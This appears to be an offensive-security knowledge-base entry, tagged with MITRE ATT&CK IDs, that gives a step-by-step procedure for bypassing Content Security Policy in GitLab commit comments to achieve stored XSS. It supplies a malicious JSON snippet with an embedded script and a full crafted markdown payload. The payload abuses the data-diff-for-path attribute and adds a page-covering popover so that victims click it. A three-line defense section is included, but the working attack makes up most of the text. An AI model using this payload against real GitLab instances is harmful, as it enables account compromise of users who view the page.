---
tags:
  - csp-bypass
  - gitlab
  - xss
type: procedure
tools:
  - '[[tools/Nokogiri]]'
  - '[[tools/jQuery]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
platforms:
  - Web
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: abe3e5c3-0302-4a33-9a4f-0c5dc73ac418
created_at: '2025-12-11T03:47:56.428Z'
updated_at: '2025-12-11T03:47:56.428Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059.007]]'
---
# Bypass CSP in GitLab Commit Comments

## Summary

This procedure bypasses Content Security Policy (CSP) in GitLab by exploiting the data-diff-for-path attribute in single_file_diff.js, allowing loading of arbitrary JSON that is parsed and injected via jQuery, enabling XSS execution even with CSP enabled.

## Description

The bypass leverages axios to fetch malicious JSON from a public snippet, which jQuery then parses and injects as HTML, circumventing CSP restrictions. This is chained with a specially crafted popover to trigger the script on user interaction. Targets GitLab commit pages where comments can be added, leading to potential account compromise.

## Requirements

1. GitLab instance with CSP enabled
2. Ability to create public snippets and projects
3. Browser for page interaction

## Defense

Defensive measures and detection strategies:

- Restrict snippet creation and monitor for malicious JSON content
- Implement strict CSP without unsafe-inline or unsafe-eval
- Use application security monitoring to detect anomalous attribute injections

## Objectives

1. Set up malicious content for CSP bypass
2. Inject bypass payload into commit comment
3. Trigger script execution via user interaction

## Instructions

### Step 1: Enable CSP

**Context**: Configure CSP on the GitLab instance to initially block XSS attempts.

Follow GitLab docs to set CSP: https://docs.gitlab.com/omnibus/settings/configuration.html#set-a-content-security-policy.

### Step 2: Create Malicious Snippet

**Context**: Upload a JSON file with embedded script to a public snippet.

Create aaa.json with:

```json
{"html":"<script>alert(document.domain)</script>"}
```

Note the raw path for use in the payload.

### Step 3: Create Project and Commit

**Context**: Set up a project with a commit to enable commenting on a commit page.

Create a new project and commit a README file.

### Step 4: Inject Bypass Payload

**Context**: Add a comment to the commit with the crafted payload.

Use the payload:

```markdown
<a><pre lang=' /" data-diff-for-path=/root/kroki1/-/snippets/9/raw/main/aaa.json '><code lang="wavedrom">csp</code></pre><pre lang=' /"id=stage1style="position:absolute;max-width:10000px;left:-1000px;top:-1000px;width:10000px;height:10000px;z-index:10000;"data-triggers="click"data-toggle=popoverdata-html=truedata-title="aaa&lt;style&gt;#stage1{pointer-events:none}svg.chevron-right{position:absolute;max-width:10000px;left:-1000px;top:-1000px !important;width:10000px;height:10000px;z-index:10001;}&lt;/style&gt;bbb"data-content=ggg'><code lang="wavedrom"> bypass </code></pre></a>
```

Replace data-diff-for-path with your JSON path.

### Step 5: Trigger Bypass

**Context**: Interact with the page to activate the popover and execute the script.

Reload the commit page and click anywhere twice to trigger the bypass.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques



## Commands Used



## Tools Used

- #axios
- [[tools/jQuery]]

## Tags

- #csp-bypass
- #xss
